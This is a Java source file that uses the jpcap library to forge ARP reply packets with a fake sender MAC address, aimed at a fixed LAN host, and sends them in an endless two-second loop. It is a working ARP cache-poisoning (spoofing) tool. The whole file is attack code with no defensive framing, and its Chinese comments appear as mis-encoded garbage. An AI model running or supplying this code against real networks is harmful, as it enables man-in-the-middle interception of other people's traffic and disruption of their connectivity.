import java.net.InetAddress;

import jpcap.JpcapCaptor;  
import jpcap.JpcapSender;  
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;  
import jpcap.packet.EthernetPacket;  


public class SendFakeApp {
	static byte[] stomac(String s) {  
        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };  
        String[] s1 = s.split("-");  
        for (int x = 0; x < s1.length; x++) {  
            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) & 0xff);  
        }  
        return mac;  
    }  
    public static void main(String[] args) throws Exception {  
        int time = 2;  // �ط����ʱ��  
        InetAddress desip = InetAddress.getByName("192.168.1.103");// ����ƭ��Ŀ��IP��ַ  
        byte[] desmac = stomac("00-1c-23-3c-41-7f");// ����ƭ��Ŀ��Ŀ��MAC����  
        InetAddress srcip = InetAddress.getByName("192.168.1.104");// ԴIP��ַ  
        byte[] srcmac = stomac("00-1C-23-2E-A7-0A"); // �ٵ�MAC����  
        // ö�����������豸  
       NetworkInterface[] devices = JpcapCaptor.getDeviceList();  
        NetworkInterface device = devices[1];  
        JpcapSender sender = JpcapSender.openDevice(device);  
        // ����ARP��  
        ARPPacket arp = new ARPPacket();  
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;  
        arp.prototype = ARPPacket.PROTOTYPE_IP;  
        arp.operation = ARPPacket.ARP_REPLY;  
        arp.hlen = 6;  
        arp.plen = 4;  
        arp.sender_hardaddr = srcmac;  
        arp.sender_protoaddr = srcip.getAddress();  
        arp.target_hardaddr = desmac;  
        arp.target_protoaddr = desip.getAddress();  
        // ����DLC֡  
        EthernetPacket ether = new EthernetPacket();  
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;  
        ether.src_mac = srcmac;  
        ether.dst_mac = desmac;  
        arp.datalink = ether;  
        // ����ARPӦ���  
        while (true) {  
            System.out.println("sending arp..");  
            sender.sendPacket(arp);  
            Thread.sleep(time * 1000);  
        }  
    }  
}  
